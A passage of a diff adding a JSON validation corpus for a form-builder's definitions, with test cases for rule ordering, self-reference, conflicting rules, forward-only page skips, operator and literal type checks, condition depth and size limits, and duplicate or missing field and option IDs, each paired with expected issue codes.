@@ -1,0 +1,2034 @@
+{
+  "description": "Definition validation corpus: structural (JSON Schema) and semantic checks.",
+  "cases": [
+    {
+      "name": "the example contract is valid",
+      "definition": "contracts/support-request.example.json",
+      "expectedIssues": []
+    },
+    {
+      "name": "conditions at the depth limit are valid",
+      "definition": {
+        "schemaVersion": "1.0",
+        "title": "Corpus form",
+        "locale": "en",
+        "pages": [
+          {
+            "id": "page_1",
+            "title": "",
+            "fieldIds": [
+              "f_a",
+              "f_b"
+            ]
+          }
+        ],
+        "fields": [
+          {
+            "id": "f_a",
+            "type": "text",
+            "label": "f_a",
+            "required": false,
+            "settings": {}
+          },
+          {
+            "id": "f_b",
+            "type": "text",
+            "label": "f_b",
+            "required": false,
+            "settings": {}
+          }
+        ],
+        "rules": [
+          {
+            "id": "rule_1",
+            "when": {
+              "not": {
+                "not": {
+                  "not": {
+                    "not": {
+                      "not": {
+                        "not": {
+                          "not": {
+                            "fieldId": "f_a",
+                            "op": "isEmpty"
+                          }
+                        }
+                      }
+                    }
+                  }
+                }
+              }
+            },
+            "action": {
+              "type": "setVisibility",
+              "targetFieldId": "f_b",
+              "onTrue": true,
+              "onFalse": false
+            }
+          }
+        ],
+        "theme": {
+          "accent": "#4F46E5",
+          "background": "#FFFFFF",
+          "text": "#111827",
+          "radius": 8
+        },
+        "success": {
+          "message": "Thanks."
+        }
+      },
+      "expectedIssues": []
+    },
+    {
+      "name": "cyclic visibility rules are rejected (a rule may only use earlier fields)",
+      "definition": {
+        "schemaVersion": "1.0",
+        "title": "Corpus form",
+        "locale": "en",
+        "pages": [
+          {
+            "id": "page_1",
+            "title": "",
+            "fieldIds": [
+              "f_a",
+              "f_b"
+            ]
+          }
+        ],
+        "fields": [
+          {
+            "id": "f_a",
+            "type": "text",
+            "label": "f_a",
+            "required": false,
+            "settings": {}
+          },
+          {
+            "id": "f_b",
+            "type": "text",
+            "label": "f_b",
+            "required": false,
+            "settings": {}
+          }
+        ],
+        "rules": [
+          {
+            "id": "rule_1",
+            "when": {
+              "fieldId": "f_b",
+              "op": "isNotEmpty"
+            },
+            "action": {
+              "type": "setVisibility",
+              "targetFieldId": "f_a",
+              "onTrue": true,
+              "onFalse": false
+            }
+          },
+          {
+            "id": "rule_2",
+            "when": {
+              "fieldId": "f_a",
+              "op": "isNotEmpty"
+            },
+            "action": {
+              "type": "setVisibility",
+              "targetFieldId": "f_b",
+              "onTrue": true,
+              "onFalse": false
+            }
+          }
+        ],
+        "theme": {
+          "accent": "#4F46E5",
+          "background": "#FFFFFF",
+          "text": "#111827",
+          "radius": 8
+        },
+        "success": {
+          "message": "Thanks."
+        }
+      },
+      "expectedIssues": [
+        {
+          "path": "/rules/0/when",
+          "code": "RULE_REFERENCES_LATER_FIELD"
+        }
+      ]
+    },
+    {
+      "name": "a rule cannot depend on the field it controls",
+      "definition": {
+        "schemaVersion": "1.0",
+        "title": "Corpus form",
+        "locale": "en",
+        "pages": [
+          {
+            "id": "page_1",
+            "title": "",
+            "fieldIds": [
+              "f_a"
+            ]
+          }
+        ],
+        "fields": [
+          {
+            "id": "f_a",
+            "type": "text",
+            "label": "f_a",
+            "required": false,
+            "settings": {}
+          }
+        ],
+        "rules": [
+          {
+            "id": "rule_1",
+            "when": {
+              "fieldId": "f_a",
+              "op": "isEmpty"
+            },
+            "action": {
+              "type": "setVisibility",
+              "targetFieldId": "f_a",
+              "onTrue": true,
+              "onFalse": false
+            }
+          }
+        ],
+        "theme": {
+          "accent": "#4F46E5",
+          "background": "#FFFFFF",
+          "text": "#111827",
+          "radius": 8
+        },
+        "success": {
+          "message": "Thanks."
+        }
+      },
+      "expectedIssues": [
+        {
+          "path": "/rules/0/when",
+          "code": "SELF_REFERENCE"
+        }
+      ]
+    },
+    {
+      "name": "two rules cannot control the same property of a field",
+      "definition": {
+        "schemaVersion": "1.0",
+        "title": "Corpus form",
+        "locale": "en",
+        "pages": [
+          {
+            "id": "page_1",
+            "title": "",
+            "fieldIds": [
+              "f_a",
+              "f_b"
+            ]
+          }
+        ],
+        "fields": [
+          {
+            "id": "f_a",
+            "type": "text",
+            "label": "f_a",
+            "required": false,
+            "settings": {}
+          },
+          {
+            "id": "f_b",
+            "type": "text",
+            "label": "f_b",
+            "required": false,
+            "settings": {}
+          }
+        ],
+        "rules": [
+          {
+            "id": "rule_1",
+            "when": {
+              "fieldId": "f_a",
+              "op": "isEmpty"
+            },
+            "action": {
+              "type": "setVisibility",
+              "targetFieldId": "f_b",
+              "onTrue": true,
+              "onFalse": false
+            }
+          },
+          {
+            "id": "rule_2",
+            "when": {
+              "fieldId": "f_a",
+              "op": "isNotEmpty"
+            },
+            "action": {
+              "type": "setVisibility",
+              "targetFieldId": "f_b",
+              "onTrue": true,
+              "onFalse": false
+            }
+          }
+        ],
+        "theme": {
+          "accent": "#4F46E5",
+          "background": "#FFFFFF",
+          "text": "#111827",
+          "radius": 8
+        },
+        "success": {
+          "message": "Thanks."
+        }
+      },
+      "expectedIssues": [
+        {
+          "path": "/rules/1",
+          "code": "CONFLICTING_RULES"
+        }
+      ]
+    },
+    {
+      "name": "page skips only move forward",
+      "definition": {
+        "schemaVersion": "1.0",
+        "title": "Corpus form",
+        "locale": "en",
+        "pages": [
+          {
+            "id": "page_1",
+            "title": "",
+            "fieldIds": [
+              "f_a"
+            ]
+          },
+          {
+            "id": "page_2",
+            "title": "",
+            "fieldIds": [
+              "f_b"
+            ]
+          },
+          {
+            "id": "page_3",
+            "title": "",
+            "fieldIds": [
+              "f_c"
+            ]
+          }
+        ],
+        "fields": [
+          {
+            "id": "f_a",
+            "type": "text",
+            "label": "f_a",
+            "required": false,
+            "settings": {}
+          },
+          {
+            "id": "f_b",
+            "type": "text",
+            "label": "f_b",
+            "required": false,
+            "settings": {}
+          },
+          {
+            "id": "f_c",
+            "type": "text",
+            "label": "f_c",
+            "required": false,
+            "settings": {}
+          }
+        ],
+        "rules": [
+          {
+            "id": "rule_1",
+            "when": {
+              "fieldId": "f_a",
+              "op": "isEmpty"
+            },
+            "action": {
+              "type": "skipToPage",
+              "sourcePageId": "page_2",
+              "targetPageId": "page_1"
+            }
+          }
+        ],
+        "theme": {
+          "accent": "#4F46E5",
+          "background": "#FFFFFF",
+          "text": "#111827",
+          "radius": 8
+        },
+        "success": {
+          "message": "Thanks."
+        }
+      },
+      "expectedIssues": [
+        {
+          "path": "/rules/0/action/targetPageId",
+          "code": "BACKWARD_SKIP"
+        }
+      ]
+    },
+    {
+      "name": "a page can have only one skip rule",
+      "definition": {
+        "schemaVersion": "1.0",
+        "title": "Corpus form",
+        "locale": "en",
+        "pages": [
+          {
+            "id": "page_1",
+            "title": "",
+            "fieldIds": [
+              "f_a"
+            ]
+          },
+          {
+            "id": "page_2",
+            "title": "",
+            "fieldIds": [
+              "f_b"
+            ]
+          },
+          {
+            "id": "page_3",
+            "title": "",
+            "fieldIds": [
+              "f_c"
+            ]
+          }
+        ],
+        "fields": [
+          {
+            "id": "f_a",
+            "type": "text",
+            "label": "f_a",
+            "required": false,
+            "settings": {}
+          },
+          {
+            "id": "f_b",
+            "type": "text",
+            "label": "f_b",
+            "required": false,
+            "settings": {}
+          },
+          {
+            "id": "f_c",
+            "type": "text",
+            "label": "f_c",
+            "required": false,
+            "settings": {}
+          }
+        ],
+        "rules": [
+          {
+            "id": "rule_1",
+            "when": {
+              "fieldId": "f_a",
+              "op": "eq",
+              "value": "x"
+            },
+            "action": {
+              "type": "skipToPage",
+              "sourcePageId": "page_1",
+              "targetPageId": "page_3"
+            }
+          },
+          {
+            "id": "rule_2",
+            "when": {
+              "fieldId": "f_a",
+              "op": "eq",
+              "value": "y"
+            },
+            "action": {
+              "type": "skipToPage",
+              "sourcePageId": "page_1",
+              "targetPageId": "page_2"
+            }
+          }
+        ],
+        "theme": {
+          "accent": "#4F46E5",
+          "background": "#FFFFFF",
+          "text": "#111827",
+          "radius": 8
+        },
+        "success": {
+          "message": "Thanks."
+        }
+      },
+      "expectedIssues": [
+        {
+          "path": "/rules/1",
+          "code": "CONFLICTING_SKIPS"
+        }
+      ]
+    },
+    {
+      "name": "a skip rule cannot use a field from a later page",
+      "definition": {
+        "schemaVersion": "1.0",
+        "title": "Corpus form",
+        "locale": "en",
+        "pages": [
+          {
+            "id": "page_1",
+            "title": "",
+            "fieldIds": [
+              "f_a"
+            ]
+          },
+          {
+            "id": "page_2",
+            "title": "",
+            "fieldIds": [
+              "f_b"
+            ]
+          },
+          {
+            "id": "page_3",
+            "title": "",
+            "fieldIds": [
+              "f_c"
+            ]
+          }
+        ],
+        "fields": [
+          {
+            "id": "f_a",
+            "type": "text",
+            "label": "f_a",
+            "required": false,
+            "settings": {}
+          },
+          {
+            "id": "f_b",
+            "type": "text",
+            "label": "f_b",
+            "required": false,
+            "settings": {}
+          },
+          {
+            "id": "f_c",
+            "type": "text",
+            "label": "f_c",
+            "required": false,
+            "settings": {}
+          }
+        ],
+        "rules": [
+          {
+            "id": "rule_1",
+            "when": {
+              "fieldId": "f_c",
+              "op": "isEmpty"
+            },
+            "action": {
+              "type": "skipToPage",
+              "sourcePageId": "page_1",
+              "targetPageId": "page_3"
+            }
+          }
+        ],
+        "theme": {
+          "accent": "#4F46E5",
+          "background": "#FFFFFF",
+          "text": "#111827",
+          "radius": 8
+        },
+        "success": {
+          "message": "Thanks."
+        }
+      },
+      "expectedIssues": [
+        {
+          "path": "/rules/0/when",
+          "code": "RULE_REFERENCES_LATER_FIELD"
+        }
+      ]
+    },
+    {
+      "name": "skip rules must name existing pages",
+      "definition": {
+        "schemaVersion": "1.0",
+        "title": "Corpus form",
+        "locale": "en",
+        "pages": [
+          {
+            "id": "page_1",
+            "title": "",
+            "fieldIds": [
+              "f_a"
+            ]
+          },
+          {
+            "id": "page_2",
+            "title": "",
+            "fieldIds": [
+              "f_b"
+            ]
+          },
+          {
+            "id": "page_3",
+            "title": "",
+            "fieldIds": [
+              "f_c"
+            ]
+          }
+        ],
+        "fields": [
+          {
+            "id": "f_a",
+            "type": "text",
+            "label": "f_a",
+            "required": false,
+            "settings": {}
+          },
+          {
+            "id": "f_b",
+            "type": "text",
+            "label": "f_b",
+            "required": false,
+            "settings": {}
+          },
+          {
+            "id": "f_c",
+            "type": "text",
+            "label": "f_c",
+            "required": false,
+            "settings": {}
+          }
+        ],
+        "rules": [
+          {
+            "id": "rule_1",
+            "when": {
+              "fieldId": "f_a",
+              "op": "isEmpty"
+            },
+            "action": {
+              "type": "skipToPage",
+              "sourcePageId": "page_1",
+              "targetPageId": "page_9"
+            }
+          }
+        ],
+        "theme": {
+          "accent": "#4F46E5",
+          "background": "#FFFFFF",
+          "text": "#111827",
+          "radius": 8
+        },
+        "success": {
+          "message": "Thanks."
+        }
+      },
+      "expectedIssues": [
+        {
+          "path": "/rules/0/action/targetPageId",
+          "code": "UNKNOWN_PAGE"
+        }
+      ]
+    },
+    {
+      "name": "operators must suit the field type",
+      "definition": {
+        "schemaVersion": "1.0",
+        "title": "Corpus form",
+        "locale": "en",
+        "pages": [
+          {
+            "id": "page_1",
+            "title": "",
+            "fieldIds": [
+              "f_a",
+              "f_b"
+            ]
+          }
+        ],
+        "fields": [
+          {
+            "id": "f_a",
+            "type": "text",
+            "label": "f_a",
+            "required": false,
+            "settings": {}
+          },
+          {
+            "id": "f_b",
+            "type": "text",
+            "label": "f_b",
+            "required": false,
+            "settings": {}
+          }
+        ],
+        "rules": [
+          {
+            "id": "rule_1",
+            "when": {
+              "fieldId": "f_a",
+              "op": "gt",
+              "value": "x"
+            },
+            "action": {
+              "type": "setVisibility",
+              "targetFieldId": "f_b",
+              "onTrue": true,
+              "onFalse": false
+            }
+          }
+        ],
+        "theme": {
+          "accent": "#4F46E5",
+          "background": "#FFFFFF",
+          "text": "#111827",
+          "radius": 8
+        },
+        "success": {
+          "message": "Thanks."
+        }
+      },
+      "expectedIssues": [
+        {
+          "path": "/rules/0/when/op",
+          "code": "OPERATOR_NOT_SUPPORTED"
+        }
+      ]
+    },
+    {
+      "name": "literals must match the field type",
+      "definition": {
+        "schemaVersion": "1.0",
+        "title": "Corpus form",
+        "locale": "en",
+        "pages": [
+          {
+            "id": "page_1",
+            "title": "",
+            "fieldIds": [
+              "f_n",
+              "f_b"
+            ]
+          }
+        ],
+        "fields": [
+          {
+            "id": "f_n",
+            "type": "integer",
+            "label": "n",
+            "required": false,
+            "settings": {}
+          },
+          {
+            "id": "f_b",
+            "type": "text",
+            "label": "f_b",
+            "required": false,
+            "settings": {}
+          }
+        ],
+        "rules": [
+          {
+            "id": "rule_1",
+            "when": {
+              "fieldId": "f_n",
+              "op": "eq",
+              "value": "10"
+            },
+            "action": {
+              "type": "setVisibility",
+              "targetFieldId": "f_b",
+              "onTrue": true,
+              "onFalse": false
+            }
+          }
+        ],
+        "theme": {
+          "accent": "#4F46E5",
+          "background": "#FFFFFF",
+          "text": "#111827",
+          "radius": 8
+        },
+        "success": {
+          "message": "Thanks."
+        }
+      },
+      "expectedIssues": [
+        {
+          "path": "/rules/0/when/value",
+          "code": "INVALID_LITERAL"
+        }
+      ]
+    },
+    {
+      "name": "choice literals must be existing option IDs",
+      "definition": {
+        "schemaVersion": "1.0",
+        "title": "Corpus form",
+        "locale": "en",
+        "pages": [
+          {
+            "id": "page_1",
+            "title": "",
+            "fieldIds": [
+              "f_pick",
+              "f_b"
+            ]
+          }
+        ],
+        "fields": [
+          {
+            "id": "f_pick",
+            "type": "dropdown",
+            "label": "pick",
+            "required": false,
+            "settings": {
+              "options": [
+                {
+                  "id": "opt_x",
+                  "label": "X"
+                }
+              ]
+            }
+          },
+          {
+            "id": "f_b",
+            "type": "text",
+            "label": "f_b",
+            "required": false,
+            "settings": {}
+          }
+        ],
+        "rules": [
+          {
+            "id": "rule_1",
+            "when": {
+              "fieldId": "f_pick",
+              "op": "eq",
+              "value": "opt_missing"
+            },
+            "action": {
+              "type": "setVisibility",
+              "targetFieldId": "f_b",
+              "onTrue": true,
+              "onFalse": false
+            }
+          }
+        ],
+        "theme": {
+          "accent": "#4F46E5",
+          "background": "#FFFFFF",
+          "text": "#111827",
+          "radius": 8
+        },
+        "success": {
+          "message": "Thanks."
+        }
+      },
+      "expectedIssues": [
+        {
+          "path": "/rules/0/when/value",
+          "code": "UNKNOWN_OPTION"
+        }
+      ]
+    },
+    {
+      "name": "conditions must reference existing fields",
+      "definition": {
+        "schemaVersion": "1.0",
+        "title": "Corpus form",
+        "locale": "en",
+        "pages": [
+          {
+            "id": "page_1",
+            "title": "",
+            "fieldIds": [
+              "f_a"
+            ]
+          }
+        ],
+        "fields": [
+          {
+            "id": "f_a",
+            "type": "text",
+            "label": "f_a",
+            "required": false,
+            "settings": {}
+          }
+        ],
+        "rules": [
+          {
+            "id": "rule_1",
+            "when": {
+              "fieldId": "f_missing",
+              "op": "isEmpty"
+            },
+            "action": {
+              "type": "setVisibility",
+              "targetFieldId": "f_a",
+              "onTrue": true,
+              "onFalse": false
+            }
+          }
+        ],
+        "theme": {
+          "accent": "#4F46E5",
+          "background": "#FFFFFF",
+          "text": "#111827",
+          "radius": 8
+        },
+        "success": {
+          "message": "Thanks."
+        }
+      },
+      "expectedIssues": [
+        {
+          "path": "/rules/0/when/fieldId",
+          "code": "UNKNOWN_FIELD"
+        }
+      ]
+    },
+    {
+      "name": "conditions deeper than 8 levels are rejected",
+      "definition": {
+        "schemaVersion": "1.0",
+        "title": "Corpus form",
+        "locale": "en",
+        "pages": [
+          {
+            "id": "page_1",
+            "title": "",
+            "fieldIds": [
+              "f_a",
+              "f_b"
+            ]
+          }
+        ],
+        "fields": [
+          {
+            "id": "f_a",
+            "type": "text",
+            "label": "f_a",
+            "required": false,
+            "settings": {}
+          },
+          {
+            "id": "f_b",
+            "type": "text",
+            "label": "f_b",
+            "required": false,
+            "settings": {}
+          }
+        ],
+        "rules": [
+          {
+            "id": "rule_1",
+            "when": {
+              "not": {
+                "not": {
+                  "not": {
+                    "not": {
+                      "not": {
+                        "not": {
+                          "not": {
+                            "not": {
+                              "fieldId": "f_a",
+                              "op": "isEmpty"
+                            }
+                          }
+                        }
+                      }
+                    }
+                  }
+                }
+              }
+            },
+            "action": {
+              "type": "setVisibility",
+              "targetFieldId": "f_b",
+              "onTrue": true,
+              "onFalse": false
+            }
+          }
+        ],
+        "theme": {
+          "accent": "#4F46E5",
+          "background": "#FFFFFF",
+          "text": "#111827",
+          "radius": 8
+        },
+        "success": {
+          "message": "Thanks."
+        }
+      },
+      "expectedIssues": [
+        {
+          "path": "/rules/0/when",
+          "code": "CONDITION_TOO_DEEP"
+        }
+      ]
+    },
+    {
+      "name": "conditions with more than 100 parts are rejected",
+      "definition": {
+        "schemaVersion": "1.0",
+        "title": "Corpus form",
+        "locale": "en",
+        "pages": [
+          {
+            "id": "page_1",
+            "title": "",
+            "fieldIds": [
+              "f_a",
+              "f_b"
+            ]
+          }
+        ],
+        "fields": [
+          {
+            "id": "f_a",
+            "type": "text",
+            "label": "f_a",
+            "required": false,
+            "settings": {}
+          },
+          {
+            "id": "f_b",
+            "type": "text",
+            "label": "f_b",
+            "required": false,
+            "settings": {}
+          }
+        ],
+        "rules": [
+          {
+            "id": "rule_1",
+            "when": {
+              "all": [
+                {
+                  "any": [
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    }
+                  ]
+                },
+                {
+                  "any": [
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    }
+                  ]
+                },
+                {
+                  "any": [
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    }
+                  ]
+                },
+                {
+                  "any": [
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    }
+                  ]
+                },
+                {
+                  "any": [
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    }
+                  ]
+                },
+                {
+                  "any": [
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    }
+                  ]
+                },
+                {
+                  "any": [
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    }
+                  ]
+                },
+                {
+                  "any": [
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    }
+                  ]
+                },
+                {
+                  "any": [
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    }
+                  ]
+                },
+                {
+                  "any": [
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    }
+                  ]
+                },
+                {
+                  "any": [
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    }
+                  ]
+                },
+                {
+                  "any": [
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    }
+                  ]
+                },
+                {
+                  "any": [
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    }
+                  ]
+                },
+                {
+                  "any": [
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    }
+                  ]
+                },
+                {
+                  "any": [
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    }
+                  ]
+                },
+                {
+                  "any": [
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    }
+                  ]
+                },
+                {
+                  "any": [
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    }
+                  ]
+                },
+                {
+                  "any": [
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    }
+                  ]
+                },
+                {
+                  "any": [
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    }
+                  ]
+                },
+                {
+                  "any": [
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    },
+                    {
+                      "fieldId": "f_a",
+                      "op": "isEmpty"
+                    }
+                  ]
+                }
+              ]
+            },
+            "action": {
+              "type": "setVisibility",
+              "targetFieldId": "f_b",
+              "onTrue": true,
+              "onFalse": false
+            }
+          }
+        ],
+        "theme": {
+          "accent": "#4F46E5",
+          "background": "#FFFFFF",
+          "text": "#111827",
+          "radius": 8
+        },
+        "success": {
+          "message": "Thanks."
+        }
+      },
+      "expectedIssues": [
+        {
+          "path": "/rules/0/when",
+          "code": "CONDITION_TOO_LARGE"
+        }
+      ]
+    },
+    {
+      "name": "every field is on exactly one page",
+      "definition": {
+        "schemaVersion": "1.0",
+        "title": "Corpus form",
+        "locale": "en",
+        "pages": [
+          {
+            "id": "page_1",
+            "title": "",
+            "fieldIds": [
+              "f_a"
+            ]
+          },
+          {
+            "id": "page_2",
+            "title": "",
+            "fieldIds": [
+              "f_a"
+            ]
+          }
+        ],
+        "fields": [
+          {
+            "id": "f_a",
+            "type": "text",
+            "label": "f_a",
+            "required": false,
+            "settings": {}
+          },
+          {
+            "id": "f_b",
+            "type": "text",
+            "label": "f_b",
+            "required": false,
+            "settings": {}
+          }
+        ],
+        "rules": [],
+        "theme": {
+          "accent": "#4F46E5",
+          "background": "#FFFFFF",
+          "text": "#111827",
+          "radius": 8
+        },
+        "success": {
+          "message": "Thanks."
+        }
+      },
+      "expectedIssues": [
+        {
+          "path": "/pages/1/fieldIds/0",
+          "code": "FIELD_ON_MULTIPLE_PAGES"
+        },
+        {
+          "path": "/fields/1",
+          "code": "FIELD_NOT_ON_PAGE"
+        }
+      ]
+    },
+    {
+      "name": "pages may only list existing fields",
+      "definition": {
+        "schemaVersion": "1.0",
+        "title": "Corpus form",
+        "locale": "en",
+        "pages": [
+          {
+            "id": "page_1",
+            "title": "",
+            "fieldIds": [
+              "f_a",
+              "f_ghost"
+            ]
+          }
+        ],
+        "fields": [
+          {
+            "id": "f_a",
+            "type": "text",
+            "label": "f_a",
+            "required": false,
+            "settings": {}
+          }
+        ],
+        "rules": [],
+        "theme": {
+          "accent": "#4F46E5",
+          "background": "#FFFFFF",
+          "text": "#111827",
+          "radius": 8
+        },
+        "success": {
+          "message": "Thanks."
+        }
+      },
+      "expectedIssues": [
+        {
+          "path": "/pages/0/fieldIds/1",
+          "code": "UNKNOWN_FIELD"
+        }
+      ]
+    },
+    {
+      "name": "field and option IDs are unique",
+      "definition": {
+        "schemaVersion": "1.0",
+        "title": "Corpus form",
+        "locale": "en",
+        "pages": [
+          {
+            "id": "page_1",
+            "title": "",
+            "fieldIds": [
+              "f_a"
+            ]
+          }
+        ],
+        "fields": [
+          {
+            "id": "f_a",
+            "type": "radio",
+            "label": "a",
+            "required": false,
+            "settings": {
+              "options": [
+                {
+                  "id": "opt_1",
+                  "label": "One"
+                },
+                {
+                  "id": "opt_1",
+                  "label": "Uno"
+                }
+              ]
+            }
+          },
+          {
+            "id": "f_a",
+            "type": "text",
+            "label": "f_a",
+            "required": false,
+            "settings": {}
+          }
+        ],
+        "rules": [],
+        "theme": {
+          "accent": "#4F46E5",
+          "background": "#FFFFFF",
+          "text": "#111827",
+          "radius": 8
+        },
+        "success": {
+          "message": "Thanks."
+        }
+      },
+      "expectedIssues": [
+        {
+          "path": "/fields/1/id",
+          "code": "DUPLICATE_ID"
+        },
+        {
+          "path": "/fields/0/settings/options/1/id",
+          "code": "DUPLICATE_OPTION_ID"
+        }
+      ]
+    },
+    {
+      "name": "settings must apply to the field type",
+      "definition": {
+        "schemaVersion": "1.0",
+        "title": "Corpus form",
+        "locale": "en",
+        "pages": [
+          {
+            "id": "page_1",
+            "title": "",
+            "fieldIds": [
+              "f_a",
+              "f_d"
+            ]
+          }
+        ],
+        "fields": [
+          {
+            "id": "f_a",
+            "type": "text",
+            "label": "f_a",
+            "required": false,
+            "settings": {
+              "options": [
+                {
+                  "id": "opt_1",
+                  "label": "One"
+                }
+              ]
+            }
+          },
+          {
+            "id": "f_d",
+            "type": "date",
